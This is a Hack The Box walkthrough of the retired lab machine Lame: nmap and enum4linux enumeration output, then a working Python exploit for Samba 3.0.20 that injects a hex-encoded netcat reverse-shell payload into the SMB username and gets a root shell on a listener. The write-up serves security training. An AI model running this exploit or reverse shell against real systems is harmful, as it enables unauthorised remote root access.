---
title: HTB | Lame
description: Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
slug: lame-htb
date: 2024-12-17 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Lame cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Lame</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.3</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap -vvv -sC -sV -An -p- 10.10.10.3 -Pn
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 46758/tcp): CLEAN (Timeout)
|   Check 3 (port 14597/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

### enum4linux

```bash
$ enum4linux 10.10.10.3
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 17 17:01:25 2024

 =========================================( Target Information )=========================================
                              
Target ........... 10.10.10.3 
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.10.10.3 )=============================
                             
[E] Can't find workgroup/domain       
                     

 =================================( Nbtstat Information for 10.10.10.3 )=================================
                              
Looking up status of 10.10.10.3       
No reply from 10.10.10.3

 ====================================( Session Check on 10.10.10.3 )====================================
                              
                              
[+] Server 10.10.10.3 allows sessions using username '', password ''    
                              
                              
 =================================( Getting domain SID for 10.10.10.3 )=================================
                              
Domain Name: WORKGROUP        
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup    
                              
                              
 ====================================( OS information on 10.10.10.3 )====================================
                              
                              
[E] Can't get OS info with smbclient  
                              
                              
[+] Got OS info for 10.10.10.3 from srvinfo:                            
        LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)                             
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 ========================================( Users on 10.10.10.3 )========================================
                              
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                      
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 ==================================( Share Enumeration on 10.10.10.3 )==================================
                              
                              
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

[+] Attempting to map shares on 10.10.10.3                              
                              
//10.10.10.3/print$     Mapping: DENIED Listing: N/A Writing: N/A       
//10.10.10.3/tmp        Mapping: OK Listing: OK Writing: N/A
//10.10.10.3/opt        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:
                              
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                              
//10.10.10.3/IPC$       Mapping: N/A Listing: N/A Writing: N/A
//10.10.10.3/ADMIN$     Mapping: DENIED Listing: N/A Writing: N/A

 =============================( Password Policy Information for 10.10.10.3 )=============================
                              
                              

[+] Attaching to 10.10.10.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] LAME
        [+] Builtin

[+] Password Info for Domain: LAME

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                    
                              
                              
Password Complexity: Disabled 
Minimum Password Length: 0


 ========================================( Groups on 10.10.10.3 )========================================
                              
                              
[+] Getting builtin groups:   
                              
                              
[+]  Getting builtin group memberships:                                 
                              
                              
[+]  Getting local groups:    
                              
                              
[+]  Getting local group memberships: 
                              
                              
[+]  Getting domain groups:   
                              
                              
[+]  Getting domain group memberships:
                              
                              
 ===================( Users on 10.10.10.3 via RID cycling (RIDS: 500-550,1000-1050) )===================
                              
                              
[I] Found new SID:            
S-1-5-21-2446995257-2525374255-2673161615                               

[+] Enumerating users using SID S-1-5-21-2446995257-2525374255-2673161615 and logon username '', password ''      
                              
S-1-5-21-2446995257-2525374255-2673161615-500 LAME\Administrator (Local User)                             
S-1-5-21-2446995257-2525374255-2673161615-501 LAME\nobody (Local User)
S-1-5-21-2446995257-2525374255-2673161615-512 LAME\Domain Admins (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-513 LAME\Domain Users (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-514 LAME\Domain Guests (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1000 LAME\root (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1001 LAME\root (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1002 LAME\daemon (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1003 LAME\daemon (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1004 LAME\bin (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1005 LAME\bin (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1006 LAME\sys (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1007 LAME\sys (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1008 LAME\sync (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1009 LAME\adm (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1010 LAME\games (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1011 LAME\tty (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1012 LAME\man (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1013 LAME\disk (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1014 LAME\lp (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1015 LAME\lp (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1016 LAME\mail (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1017 LAME\mail (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1018 LAME\news (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1019 LAME\news (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1020 LAME\uucp (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1021 LAME\uucp (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1025 LAME\man (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1026 LAME\proxy (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1027 LAME\proxy (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1031 LAME\kmem (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1041 LAME\dialout (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1043 LAME\fax (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1045 LAME\voice (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1049 LAME\cdrom (Domain Group)

 ================================( Getting printer info for 10.10.10.3 )================================
                              
No printers returned.         


enum4linux complete on Tue Dec 17 17:02:53 2024
```

## Exploitation

### Samba smbd 3.0.20-Debian
```bash
$ cat exploit.py 
#!/usr/bin/python3
#exploit Samba smbd 3.0.20-Debian

from smb import *
from smb.SMBConnection import *

# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.11 LPORT=1337 -f python

buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f"
buf += b"\x6d\x69\x66\x75\x63\x3b\x20\x6e\x63\x20\x31\x30"
buf += b"\x2e\x31\x30\x2e\x31\x36\x2e\x31\x31\x20\x31\x33"
buf += b"\x33\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6d\x69"
buf += b"\x66\x75\x63\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73"
buf += b"\x68\x20\x3e\x2f\x74\x6d\x70\x2f\x6d\x69\x66\x75"
buf += b"\x63\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f"
buf += b"\x74\x6d\x70\x2f\x6d\x69\x66\x75\x63"


userID = "/=` nohup " + buf.decode('utf-8') + "`"
password = 'password'
victim_ip = '10.10.10.3'

conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
conn.connect(victim_ip, 445)

------------------------------------------
$ python3 exploit.py

------------------------------------------

$ nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.10.3 48005
whoami
root
cat /root/root.txt
03ce.....b6ed
```

### user flag - makis
```bash
root@lame:/home# cd /home/makis/
root@lame:/home/makis# ls
user.txt
root@lame:/home/makis# cat user.txt 
d336.....2192
root@lame:/home/makis# 
```